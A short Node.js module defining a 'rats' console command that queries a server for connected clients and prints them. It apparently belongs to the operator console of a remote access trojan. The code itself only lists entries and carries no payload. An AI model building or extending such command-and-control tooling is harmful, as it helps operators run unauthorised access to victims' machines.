const axios = require("axios").default;

module.exports = class RatsCommand {

    constructor() {
        this.name = "rats";
        this.description = "Get a list of all rats";
    };

    async run() {
        const rats = (await axios.get(`http://${process.env.HOST}/rats`)).data;
        if (!rats.length) return console.log("No rats are connected");
        console.log(`RATS:\n${rats.join("\n")}`);
    };

};